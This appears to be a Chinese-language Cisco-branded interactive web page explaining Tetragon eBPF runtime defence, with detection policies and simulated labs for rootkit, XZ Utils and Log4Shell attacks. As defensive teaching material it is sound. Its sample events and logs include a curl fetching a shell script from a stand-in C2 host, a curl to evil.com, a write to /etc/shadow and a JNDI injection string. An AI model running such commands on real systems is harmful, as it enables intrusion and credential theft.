                    <line x1="200" y1="270" x2="200" y2="320" stroke="#E2231A" stroke-width="3" marker-end="url(#arrow-red)"/>
                    <path d="M 380 340 L 280 340" stroke="#E2231A" stroke-width="2" stroke-dasharray="4"/>
                    <rect x="580" y="320" width="100" height="60" rx="4" fill="#E2231A"/>
                    <text x="630" y="355" text-anchor="middle" fill="white" font-weight="bold">SIGKILL</text>
                    <path d="M 280 350 Q 450 400 630 380" fill="none" stroke="#E2231A" stroke-width="2" marker-end="url(#arrow-red)"/>
                </svg>
            </div>

            <!-- [NEW] SRE Performance & Certainty Panel -->
            <div class="perf-insight-panel">
                <div style="flex: 1.2;">
                    <div class="case-badge" style="background: var(--cisco-midnight);">SRE Perspective</div>
                    <h3 style="margin-bottom:15px;">为什么 Tetragon 对生产环境是安全的？</h3>
                    <p style="font-size: 0.9rem;">不同于传统的运行时工具，Tetragon 专为高性能关键业务设计。eBPF 的**验证器 (Verifier)** 确保加载的程序绝不会死循环或挂死内核，而**内核态执行**规避了海量的 CPU 指令周期。</p>
                    <ul style="font-size: 0.85rem; padding-left: 20px;">
                        <li><b>规避上下文切换：</b> 过滤逻辑直接在内核执行，仅需发送极少量的事件到用户态。</li>
                        <li><b>数据零拷贝：</b> 探测点与策略引擎共享 BPF Maps，无需昂贵的数据序列化与复制。</li>
                    </ul>
                </div>
                <div class="perf-bar-chart">
                    <div class="perf-bar-item">
                        <div class="perf-label"><span>传统用户态审计 (CPU Overhead)</span> <span>High</span></div>
                        <div class="perf-track"><div class="perf-fill" style="width: 85%; background: var(--cisco-red);"></div></div>
                    </div>
                    <div class="perf-bar-item">
                        <div class="perf-label"><span>Tetragon eBPF 审计 (CPU Overhead)</span> <span>Minimal (&lt;1%)</span></div>
                        <div class="perf-track"><div class="perf-fill" style="width: 15%; background: var(--cisco-green);"></div></div>
                    </div>
                </div>
            </div>

            <div class="mechanism-card" style="margin-top: 40px;">
                <div class="expert-persp-box" style="margin-top:20px; border-left-color: var(--cisco-red); background: #FFF5F5; color: var(--cisco-midnight);">
                    <strong>LSM BPF 阻断 vs 用户态 LD_PRELOAD 劫持</strong>
                    <p style="font-size: 0.95rem; margin-top:10px; opacity:0.9;">基于 <b>LD_PRELOAD</b> 的用户态劫持极其脆弱，攻击者只需使用静态链接的二进制文件或执行 <code>unset LD_PRELOAD</code> 即可轻易绕过监控。而 Tetragon 挂载于内核 <b>LSM BPF</b> 接口。无论攻击者如何尝试修改路径或环境变量，只要触碰系统资源，就必须触发检查。这提供了物理层面的“审计一致性”且对攻击者完全透明。</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 5: Ancestry -->
    <section id="ancestry-context" style="background: #FFFFFF;">
        <div class="container">
            <div class="section-header">
                <h2>深度上下文与进程溯源</h2>
                <p>在安全审计中，仅知道“谁被杀了”是不够的，你必须知道它“从哪儿来”。Tetragon 通过 eBPF 维护了内核态的进程状态表，即使中间父进程已退出，依然能完整回溯整个攻击路径。</p>
            </div>
            <div style="display: flex; flex-wrap: wrap; gap: 40px; align-items: center;">
                <div style="flex: 1; min-width: 320px;">
                    <div class="ancestry-container">
                        <div class="ancestry-node"><div class="node-icon">C</div><div class="node-info"><div class="node-name">containerd-shim</div><div class="node-meta">PID: 1024</div></div><div class="node-tag">Runtime</div></div>
                        <div class="ancestry-node"><div class="node-icon" style="background: var(--cisco-blue);">S</div><div class="node-info"><div class="node-name">entrypoint.sh</div><div class="node-meta">PID: 1025</div></div><div class="node-tag">Init</div></div>
                        <div class="ancestry-node"><div class="node-icon" style="background: var(--cisco-orange);">J</div><div class="node-info"><div class="node-name">java -jar app.jar</div><div class="node-meta">PID: 1080</div></div><div class="node-tag">App</div></div>
                        <div class="ancestry-node alert"><div class="node-icon" style="background: var(--cisco-red);">B</div><div class="node-info"><div class="node-name">/bin/bash (Reverse Shell)</div><div class="node-meta">PID: 2550</div></div><div class="node-tag" style="background: var(--cisco-red); color: white;">Blocked</div></div>
                    </div>
                </div>
                <div style="flex: 1; min-width: 320px;">
                    <h3>解决传统日志碎片化难题</h3>
                    <p>传统工具依赖进程事件流的拼接。如果一个中间层脚本在攻击发生前就退出，审计日志会失去关联。Tetragon 利用 BPF Map 保证了证据链的完整性与不可伪造性。</p>
                    <div class="highlight-box">
                        <strong>Tetragon 的 BPF 状态机优势：</strong>
                        <ul style="font-size: 0.95rem; list-style: none; margin-top: 10px;">
                            <li style="margin-bottom: 8px;">✅ <b>内核态持久化：</b> 进程信息不受退出的影响。</li>
                            <li style="margin-bottom: 8px;">✅ <b>身份识别联动：</b> 自动关联 K8s Pod 标签。</li>
                            <li>✅ <b>不可伪造：</b> 数据来源于内核 <code>task_struct</code> 遍历。</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- [RESTORED FULL CONTENT]: 应用场景与防御价值 (Value) -->
    <section id="scenarios" style="background: #F9FAFB;">
        <div class="container">
            <div class="section-header">
                <h2>应用场景与防御价值 (Value)</h2>
                <p>将安全策略下沉到内核，构建不可绕过的运行时防御边界。</p>
            </div>
            <div class="grid-4">
                <div class="card" style="border-top: 4px solid var(--cisco-red);">
                    <strong>深度防御 (Security)</strong>
                    <ul style="font-size: 0.85rem; list-style: none; margin-top:10px;">
                        <li style="margin-bottom:8px;">• <b>文件篡改：</b> 监控 <code>/etc/passwd</code>, <code>/etc/shadow</code> 等敏感配置文件的 <code>write</code> 行为。</li>
                        <li style="margin-bottom:8px;">• <b>反弹 Shell：</b> 监控 <code>connect</code> 调用，禁止非白名单地址的外连企图。</li>
                        <li>• <b>容器逃逸：</b> 检测异常的 Namespace 挂载行为，强制执行边界隔离。</li>
                    </ul>
                </div>
                <div class="card" style="border-top: 4px solid var(--cisco-sky);">
                    <strong>安全合规 (Compliance)</strong>
                    <p style="font-size: 0.85rem; margin-top: 10px;">实时检测容器内执行 <code>curl</code>, <code>apt-get</code>, <code>wget</code> 等违规运维命令。通过行为白名单确保生产环境的“不可变性（Immutability）”，满足 SOC2/PCI-DSS 合规性审计。</p>
                </div>
                <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                    <strong>故障排查 & 零信任</strong>
                    <p style="font-size: 0.85rem; margin-top: 10px;">通过监控 TCP SYN 重传定位网络延迟瓶颈。基于 Kubernetes 身份执行“最小权限访问”策略，确保进程只能访问声明的外部域名。</p>
                </div>
                <div class="card" style="border-top: 4px solid var(--cisco-midnight);">
                    <strong>取证分析 (Forensics)</strong>
                    <p style="font-size: 0.85rem; margin-top: 10px;">入侵发生后，利用 Tetragon 的深度祖先进程树回溯攻击者的横向移动轨迹、指令执行序列及环境变量指纹，提供法庭级证据链。</p>
                </div>
            </div>

            <!-- [NEW] Ecosystem Integration / Pipeline -->
            <div class="view-section" style="margin-top: 80px;">
                <div class="view-title">安全管道集成 (Security Pipeline)</div>
                <p>Tetragon 不仅仅是一个阻断工具，更是现代 SOC 的核心数据源。它将内核原始信号转化为结构化的 JSON 事件流。</p>
                <div class="pipeline-container">
                    <div class="pipeline-node">
                        <strong>Kernel Hook</strong>
                        <p style="font-size: 0.75rem;">eBPF Signals</p>
                    </div>
                    <div style="font-weight:bold; color: var(--cisco-blue);">→</div>
                    <div class="pipeline-node" style="border-color: var(--cisco-orange);">
                        <strong>Tetragon Agent</strong>
                        <p style="font-size: 0.75rem;">Identity Enrichment</p>
                    </div>
                    <div style="font-weight:bold; color: var(--cisco-blue);">→</div>
                    <div class="pipeline-node" style="border-color: var(--cisco-midnight);">
                        <strong>gRPC / JSON Export</strong>
                        <p style="font-size: 0.75rem;">Structured Telemetry</p>
                    </div>
                    <div style="font-weight:bold; color: var(--cisco-blue);">→</div>
                    <div class="pipeline-node" style="border-color: var(--cisco-sky);">
                        <strong>Splunk / Cisco XDR</strong>
                        <p style="font-size: 0.75rem;">Alerting & Visualization</p>
                    </div>
                </div>

                <div class="yaml-block" style="border-left-color: var(--cisco-blue);">
<span style="color: #6A9955;">// Typical Tetragon JSON Event Schema</span>
{
  <span class="yaml-key">"process_exec"</span>: {
    <span class="yaml-key">"process"</span>: { <span class="yaml-key">"pod"</span>: { <span class="yaml-key">"name"</span>: <span class="yaml-val">"payment-app-84f"</span>, <span class="yaml-key">"namespace"</span>: <span class="yaml-val">"prod"</span> }, <span class="yaml-key">"binary"</span>: <span class="yaml-val">"/usr/bin/curl"</span> },
    <span class="yaml-key">"arguments"</span>: <span class="yaml-val">"http://malicious-c2.io/shell.sh"</span>,
    <span class="yaml-key">"action"</span>: <span class="yaml-val">"KILLED"</span>
  }
}</div>
            </div>
        </div>
    </section>

    <!-- Section 7: Policy Discovery -->
    <section id="policy-discovery" style="background: white; border-bottom: 1px solid var(--cisco-platinum);">
        <div class="container">
            <div class="section-header">
                <h2>策略发现：从观测到防御的自动化转化</h2>
                <p>安全策略不应靠手动猜测。Tetragon 可以通过观测业务在测试环境的正常行为，自动发现并提炼安全策略。</p>
            </div>
            <div class="discovery-card">
                <div class="log-side" id="log-view">
                    <div style="color: #6CC24A; margin-bottom: 15px; font-weight: bold;">[OBSERVABILITY LOG STREAM]</div>
                    <div class="log-line">{"process": "java", "op": "exec", "target": "whoami"}</div>
                    <div class="log-line highlight">{"process": "java", "op": "exec", "target": "curl", "args": ["evil.com"]}</div>
                    <div class="log-line">{"process": "nginx", "op": "connect", "dest": "10.0.0.1"}</div>
                    <div class="log-line highlight">{"process": "bash", "op": "write", "path": "/etc/shadow"}</div>
                </div>
                <div class="policy-side">
                    <div class="policy-header">
                        <strong style="color: var(--cisco-midnight);">TracingPolicy 预览</strong>
                        <span id="discovery-status" style="font-size: 0.75rem;">待生成...</span>
                    </div>
                    <div id="policy-container" style="height: 220px; border: 1px solid #E4E4E4; border-radius: 8px; padding: 15px; background: #FAFAFA; overflow: hidden;">
                        <div id="empty-policy-text" style="text-align: center; color: #999; padding-top: 80px;">点击下方按钮提取策略</div>
                        <div id="generated-yaml" style="display: none; font-family: monospace; font-size: 0.8rem; white-space: pre; color: #333;">
<span style="color: #005cc5;">apiVersion</span>: <span style="color: #032f62;">cilium.io/v1alpha1</span>
<span style="color: #005cc5;">kind</span>: <span style="color: #032f62;">TracingPolicy</span>
<span style="color: #005cc5;">spec</span>:
  <span style="color: #005cc5;">kprobes</span>:
  - <span style="color: #005cc5;">call</span>: <span style="color: #032f62;">"sys_execve"</span>
    <span style="color: #005cc5;">selectors</span>:
    - <span style="color: #005cc5;">matchBinaries</span>:
      - <span style="color: #005cc5;">values</span>: [<span style="color: #032f62;">"/usr/bin/curl"</span>]
      <span style="color: #005cc5;">matchActions</span>:
      - <span style="color: #005cc5;">action</span>: <span style="color: #d73a49;">Sigkill</span></div>
                    </div>
                    <div style="margin-top: 20px; text-align: center;">
                        <button class="btn-primary" id="discover-btn" onclick="startDiscovery()" style="background: var(--cisco-blue); color: white; border: none; padding: 12px 24px; border-radius: 20px; font-weight: 600; cursor: pointer;">转换为防御策略</button>
                    </div>
                </div>
            </div>
            <div id="discovery-msg" style="display:none; text-align: center; color: var(--cisco-green); font-weight: bold;">✅ 策略已提取并准备应用至实验室！</div>
            <!-- [NEW] Logic Bridge Hint -->
            <div id="sync-hint" style="display:none; text-align: center; font-size: 0.85rem; color: var(--cisco-midnight); margin-top: 10px;">💡 该策略已自动同步至 Scenario I 实验环境</div>
        </div>
    </section>

    <!-- [RESTORED FULL CONTENT]: 实时攻防演练实验室 -->
    <section id="lab-section" style="background: #F9FAFB;">
        <div class="container">
            <div class="section-header">
                <h2>实时攻防演练实验室</h2>
                <p>沉浸式体验内核级威胁阻断。请在下方实验场景中点击“启动演练”。</p>
            </div>

            <!-- [NEW] LAB 0: Installation & Setup Simulation -->
            <div class="mechanism-card" id="card-scenario-0">
                <!-- [NEW] Enforcement Status Badge -->
                <div class="enforcement-status" id="status-0"><div class="status-dot"></div><span class="status-text">MODE: MONITORING</span></div>
                
                <div class="case-badge" style="background: var(--cisco-midnight);">Scenario 0</div>
                <h4 style="border-left-color: var(--cisco-midnight);">Tetragon 部署与策略下发</h4>
                <div class="view-section">
                    <p>在开始防御之前，我们需要将 Tetragon 注入到基础设施中。Tetragon 支持多种环境，能够无缝感知云原生上下文。</p>
                    <div class="tab-container">
                        <div class="tab-header">
                            <button class="tab-btn active" id="btn-tab-k8s" onclick="switchSetupTab('k8s')">Kubernetes (Helm)</button>
                            <button class="tab-btn" id="btn-tab-linux" onclick="switchSetupTab('linux')">Linux 原生 (Binary)</button>
                        </div>
                    </div>
                    <div id="setup-description">
                        <div id="setup-k8s" class="setup-detail">
                            <p><strong>Kubernetes 部署：</strong>通过 Helm 仓库安装。Tetragon 会以 DaemonSet 形式运行在每个节点上，自动挂载 eBPF 程序并监听 API Server。</p>
                        </div>
                        <div id="setup-linux" class="setup-detail" style="display:none;">
                            <p><strong>Linux 原生部署：</strong>适用于非容器化环境或边缘节点。直接运行二进制文件，通过本地 YAML 文件下发策略，利用 systemd 保证持久运行。</p>
                        </div>
                    </div>
                </div>
                <div style="display: flex; gap: 12px; margin-top: 15px;">
                    <button class="btn-primary" onclick="runSetupSimulation()" id="setupBtn" style="background: var(--cisco-midnight); color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">执行安装与策略下发</button>
                    <button class="btn-outline" onclick="resetTerminal('setupOutput')" style="background: transparent; border: 1px solid var(--cisco-midnight); color: var(--cisco-midnight); padding: 10px 20px; border-radius: 20px; cursor: pointer;">清空终端</button>
                </div>
                <div class="terminal" id="term-wrap-0">
                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
                    <div class="terminal-content" id="setupOutput">
                        <div class="login-info">Infrastructure Console Initialized...</div>
                        <div><span class="prompt">admin@infra:~$</span> <span class="cursor"></span></div>
                    </div>
                </div>
            </div>

            <!-- LAB 1: ROOTKIT (Scenario I) -->
            <div class="mechanism-card" id="card-scenario-1">
                <!-- [NEW] Enforcement Status Badge -->
                <div class="enforcement-status" id="status-1"><div class="status-dot"></div><span class="status-text">MODE: MONITORING</span></div>
                
                <div class="case-badge">Scenario I</div>
                <span class="mitre-tag">MITRE T1546.012</span>
                <h4>Rootkit 持久化拦截</h4>
                <div class="view-section">
                    <p><strong>攻击原理：劫持动态链接。</strong>攻击者常尝试修改系统关键配置文件 <code>/etc/ld.so.preload</code>。在该文件中添加恶意动态库路径后，系统在启动任何新进程时都会强制加载该恶意库。这使得黑客能劫持系统函数（如 <code>read</code>, <code>write</code>, <code>execve</code>），实现完全的“隐身”监控和后门持久化。</p>
                    <p><strong>Tetragon 对策：</strong>配置监控该文件的 <code>sys_openat</code> 调用。一旦检测到尝试以“写入”模式打开该文件的非预期进程（如 Shell 脚本），Tetragon 会立即实施内核级阻断。</p>
                </div>
                <div class="yaml-block">
<span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"protect-ld-so-preload"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_openat"</span>
    <span class="yaml-key">matchArgs</span>:
    - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
      <span class="yaml-key">values</span>: [<span class="yaml-val">"/etc/ld.so.preload"</span>]
    <span class="yaml-key">matchActions</span>:
    - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
                <div style="display: flex; gap: 12px; margin-top: 15px;">
                    <button class="btn-primary" onclick="runAttackSequence()" id="attackBtn" style="background: var(--cisco-blue); color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">启动演练</button>
                    <button class="btn-outline" onclick="resetTerminal('termOutput')" style="background: transparent; border: 1px solid var(--cisco-blue); color: var(--cisco-blue); padding: 10px 20px; border-radius: 20px; cursor: pointer;">重置终端</button>
                </div>
                <div class="terminal" id="term-wrap-1">
                    <!-- [NEW] Shield Watermark -->
                    <div class="shield-watermark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
                    <div class="terminal-content" id="termOutput">
                        <div class="login-info">Last login: Today from 192.168.1.5</div>
                        <div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>
                    </div>
                </div>
            </div>

            <!-- LAB 2: XZ UTILS (Scenario II) -->
            <div class="mechanism-card" id="card-scenario-2">
                <!-- [NEW] Enforcement Status Badge -->
                <div class="enforcement-status" id="status-2"><div class="status-dot"></div><span class="status-text">MODE: MONITORING</span></div>
                
                <div class="case-badge">Scenario II</div>
                <span class="mitre-tag">MITRE T1574.002</span>
                <h4>XZ Utils 供应链攻击 (CVE-2024-3094)</h4>
                <div class="view-section">
                    <p><strong>攻击机理：IFUNC 劫持。</strong>XZ 后门利用了 GNU 链接器的 <b>Indirect Function (IFUNC)</b> 机制。攻击者注入恶意 SO，在 <code>sshd</code> 加载 <code>liblzma</code> 时通过间接函数解析将正常的 RSA 认证逻辑替换为后门逻辑。这种“内存中后门”不会在磁盘上留下异常痕迹。</p>
                    <p><strong>检测与阻断：</strong>由于后门激活后必须通过 <code>execve</code> 派生子进程才能执行恶意命令，Tetragon 通过锁定 <code>sshd</code> 二进制路径，感应并杀掉非预期的 <code>/bin/sh</code> 派生行为。</p>
                </div>
                <div class="yaml-block">
<span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"block-sshd-fork"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_execve"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchBinaries</span>:
      - <span class="yaml-key">operator</span>: <span class="yaml-val">"In"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/usr/sbin/sshd"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
                <div style="display: flex; gap: 12px; margin-top: 15px;">
                    <button class="btn-primary" onclick="runXZSimulation()" id="xzBtn" style="background:var(--cisco-midnight); color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">启动演练</button>
                    <button class="btn-outline" onclick="resetTerminal('xzOutput')" style="background: transparent; border: 1px solid var(--cisco-midnight); color: var(--cisco-midnight); padding: 10px 20px; border-radius: 20px; cursor: pointer;">重置终端</button>
                </div>
                <div class="terminal" id="term-wrap-2">
                    <!-- [NEW] Shield Watermark -->
                    <div class="shield-watermark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
                    <div class="terminal-content" id="xzOutput">
                        <div class="login-info">Last login: Today from 10.128.0.45</div>
                        <div><span class="prompt">root@prod-node:~$</span> <span class="cursor"></span></div>
                    </div>
                </div>
            </div>

            <!-- LAB 3: LOG4SHELL (Scenario III) -->
            <div class="mechanism-card" id="card-scenario-3">
                <!-- [NEW] Enforcement Status Badge -->
                <div class="enforcement-status" id="status-3"><div class="status-dot"></div><span class="status-text">MODE: MONITORING</span></div>
                
                <div class="case-badge">Scenario III</div>
                <span class="mitre-tag">MITRE T1190</span>
                <h4>Log4Shell 漏洞防护 (CVE-2021-44228)</h4>
                <div class="view-section">
                    <p><strong>JNDI 注入原理：递归解析劫持。</strong>Log4j 库在处理日志时会递归解析 <code>${jndi:ldap://...}</code> 字符串。这强制 Java 应用连接远程服务器下载并执行恶意字节码。这是典型的从“合规应用层行为”转化为“恶意内核级行为”的案例。</p>
                    <p><strong>运行时补救：</strong>通过 Tetragon 实施<b>“虚拟补丁 (Virtual Patching)”</b>。即使应用未升级，只要通过策略禁止 Java 进程调用 <code>execve</code> 启动不受信的 Shell，就能在 RCE 发生的瞬间切断攻击链。</p>
                </div>
                <div class="yaml-block">
<span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"block-java-fork"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_execve"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchBinaries</span>:
      - <span class="yaml-key">operator</span>: <span class="yaml-val">"In"</span>
        <span class="yaml-key">values</span>: [<span style="color: #CE9178;">"/usr/bin/java"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
                <div style="display: flex; gap: 12px; margin-top: 15px;">
                    <button class="btn-primary" onclick="runLog4jSimulation()" id="log4jBtn" style="background:var(--cisco-orange); color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">启动演练</button>
                    <button class="btn-outline" onclick="resetTerminal('log4jOutput')" style="background: transparent; border: 1px solid var(--cisco-orange); color: var(--cisco-orange); padding: 10px 20px; border-radius: 20px; cursor: pointer;">重置终端</button>
                </div>
                <div class="terminal" id="term-wrap-3">
                    <!-- [NEW] Shield Watermark -->
                    <div class="shield-watermark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
                    <div class="terminal-content" id="log4jOutput">
                        <div class="login-info">Last login: Today from 172.16.2.10</div>
                        <div><span class="prompt">root@java-app:~$</span> <span class="cursor"></span></div>
                    </div>
                </div>
            </div>

            <!-- [NEW] MTTR Comparison Card -->
            <div class="mttr-card">
                <h4 style="color: var(--cisco-midnight);">性能对比：平均响应时间 (MTTR)</h4>
                <div class="mttr-grid">
                    <div class="mttr-stat">
                        <div class="dash-label">传统日志分析 + 自动化</div>
                        <div class="dash-value" style="color: var(--cisco-red); font-size: 1.2rem;">~ 5 - 15 分钟</div>
                        <p style="font-size: 0.75rem; margin-top:5px;">(收集 -> 传输 -> 分析 -> 策略下发)</p>
                    </div>
                    <div class="mttr-stat">
                        <div class="dash-label">Tetragon In-Kernel Enforcement</div>
                        <div class="dash-value" style="color: var(--cisco-green); font-size: 1.2rem;">&lt; 500 微秒</div>
                        <p style="font-size: 0.75rem; margin-top:5px;">(内核态实时识别并发送 SIGKILL)</p>
                    </div>
                </div>
            </div>

        </div>
    </section>

    <!-- [NEW] Strategic Roadmap Section -->
    <section id="roadmap" style="background: white;">
        <div class="container">
            <div class="section-header">
                <h2>从观测到防御：企业级演进建议</h2>
                <p>建设云原生运行时安全不是一蹴而就的，我们建议采用“渐进式”防御路线。</p>
            </div>
            <div class="roadmap-container">
                <div class="roadmap-step">
                    <div class="step-num">1</div>
                    <strong>Runtime Visibility</strong>
                    <p style="font-size: 0.85rem; margin-top:10px;">初步部署 Tetragon。开启所有关键系统调用的审计日志（Audit Logs），将高质量的内核原始信号送入 Splunk/Cisco XDR，建立全网资产行为视图。</p>
                </div>
                <div class="roadmap-step">
                    <div class="step-num">2</div>
                    <strong>Policy Discovery</strong>
                    <p style="font-size: 0.85rem; margin-top:10px;">在测试/预发环境开启策略发现功能。通过观察合法进程（如 Java/Nginx）的行为，自动提炼出“已知良好”的黄金行为白名单。</p>
                </div>
                <div class="roadmap-step" style="border-color: var(--cisco-blue);">
                    <div class="step-num" style="background: var(--cisco-midnight);">3</div>
                    <strong>In-Kernel Enforcement</strong>
                    <p style="font-size: 0.85rem; margin-top:10px;">正式下发 SIGKILL 阻断策略。将防御边界从“检测并报警”提升至“亚毫秒级内核态强制阻隔”，彻底杜绝 TOCTOU 攻击。</p>
                </div>
            </div>
        </div>
    </section>

    <!-- [RESTORED FULL CONTENT]: 总结与核心见解 -->
    <section class="final-conclusion">
        <div class="container">
            <h2>总结与核心见解</h2>
            <div class="conclusion-core">
                Tetragon 的核心价值在于将安全从“被动防御”转变为“基于预期行为的主动策略”。
            </div>
            <div class="conclusion-grid">
                <div class="conclusion-item">
                    <strong>内核态强制执行</strong>
                    <p>利用 eBPF 的高性能钩子，在系统调用层面实现亚毫秒级的防御响应，确保在恶意操作发生前即刻阻断。</p>
                </div>
                <div class="conclusion-item">
                    <strong>零信任运行时</strong>
                    <p>不假设任何进程是安全的。通过深层上下文感知（用户、二进制路径、命名空间），仅允许白名单内的合法操作。</p>
                </div>
                <div class="conclusion-item">
                    <strong>极低性能损耗</strong>
                    <p>在内核空间完成过滤，规避了昂贵的上下文切换开销，确保为高性能生产业务提供坚如夯实的保护。</p>
                </div>
            </div>
        </div>
    </section>

    <footer>
        <div class="container" style="text-align: center; color: #999; font-size: 0.9rem; padding: 40px 0;">
            <p>&copy; 2025 Cisco Security Insight. Powered by eBPF & Tetragon.</p>
        </div>
    </footer>

    <script>
        // Global State
        let currentLang = 'zh';
        let setupMode = 'k8s';

        // Language Switcher Logic
        function setLanguage(lang) {
            currentLang = lang;
            document.body.className = 'lang-' + lang;
            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelector(`.lang-btn[id="btn-${lang}"]`).classList.add('active');
        }

        // Setup Tab Switcher
        function switchSetupTab(mode) {
            setupMode = mode;
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            document.getElementById(`btn-tab-${mode}`).classList.add('active');
            
            document.querySelectorAll('.setup-detail').forEach(el => el.style.display = 'none');
            document.getElementById(`setup-${mode}`).style.display = 'block';
            resetTerminal('setupOutput');
        }

        // Smooth scroll
        function scrollToId(id) {
            document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
        }

        // Terminal Logic
        async function typeWriter(text, element) {
            for (let char of text) {
                element.innerHTML += char;
                await new Promise(r => setTimeout(r, 40)); // Typing speed
            }
        }

        function resetTerminal(targetId) {
            const el = document.getElementById(targetId);
            const promptMap = { 
                'setupOutput': { prompt: 'admin@infra:~$', ip: 'Console' },
                'termOutput': { prompt: 'root@prod-db:~#', ip: '192.168.1.5' }, 
                'xzOutput': { prompt: 'root@prod-node:~$', ip: '10.128.0.45' }, 
                'log4jOutput': { prompt: 'root@java-app:~$', ip: '172.16.2.10' } 
            };
            const config = promptMap[targetId];
            const info = targetId === 'setupOutput' ? 'Infrastructure Console Initialized...' : `Last login: Today from ${config.ip}`;
            el.innerHTML = `<div class="login-info">${info}</div><div><span class="prompt">${config.prompt}</span> <span class="cursor"></span></div>`;
            el.scrollTop = 0;
            // Remove watermark/shield states on reset
            const wrap = el.closest('.terminal');
            if (wrap) wrap.classList.remove('shield-active');
            const statusIdx = targetId.split('Output')[0] === 'setup' ? '0' : (targetId === 'termOutput' ? '1' : (targetId === 'xzOutput' ? '2' : '3'));
            const statusLabel = document.getElementById(`status-${statusIdx}`);
            if (statusLabel) {
                statusLabel.classList.remove('active');
                statusLabel.querySelector('.status-text').innerText = 'MODE: MONITORING';
            }
        }

        /* [ENHANCED] Update Shield Status Label */
        function activateShield(id) {
            const statusLabel = document.getElementById(`status-${id}`);
            if (statusLabel) {
                statusLabel.classList.add('active');
                statusLabel.querySelector('.status-text').innerText = 'MODE: ENFORCING';
            }
        }

        /* [ENHANCED] Show Shield Watermark */
        function triggerShieldEffect(wrapId) {
            const wrap = document.getElementById(wrapId);
            wrap.classList.add('shield-active');
            setTimeout(() => wrap.classList.remove('shield-active'), 1200);
        }

        async function startDiscovery() {
            const btn = document.getElementById('discover-btn');
            const yaml = document.getElementById('generated-yaml');
            const empty = document.getElementById('empty-policy-text');
            const status = document.getElementById('discovery-status');
            const msg = document.getElementById('discovery-msg');
            const hint = document.getElementById('sync-hint');
            btn.disabled = true;
            status.innerText = "分析日志中...";
            document.querySelectorAll('.log-line.highlight').forEach(l => l.style.backgroundColor = 'rgba(108, 194, 74, 0.2)');
            await new Promise(r => setTimeout(r, 1000));
            empty.style.display = 'none';
            yaml.style.display = 'block';
            yaml.classList.add('yaml-transfer');
            status.innerHTML = "<b style='color:var(--cisco-green)'>策略已提炼</b>";
            msg.style.display = 'block';
            hint.style.display = 'block'; // [ENHANCED] Show logic bridge hint
            setTimeout(() => { scrollToId('lab-section'); }, 2000);
        }

        // [NEW] Scenario 0: Setup Simulation
        async function runSetupSimulation() {
            const btn = document.getElementById('setupBtn');
            const termContent = document.getElementById('setupOutput');
            btn.disabled = true;
            resetTerminal('setupOutput');

            const firstPrompt = termContent.lastElementChild;
            firstPrompt.querySelector('.cursor').style.display = 'none';
            let cmd1 = document.createElement('span');
            cmd1.className = "cmd-text";
            firstPrompt.appendChild(cmd1);

            if (setupMode === 'k8s') {
                await typeWriter('helm repo add cilium https://helm.cilium.io && helm install tetragon cilium/tetragon -n kube-system', cmd1);
                await new Promise(r => setTimeout(r, 600));
                termContent.innerHTML += `<div class="terminal-output-line" style="color: #61C6E2;">Fetching chart... Installing DaemonSet...</div>`;
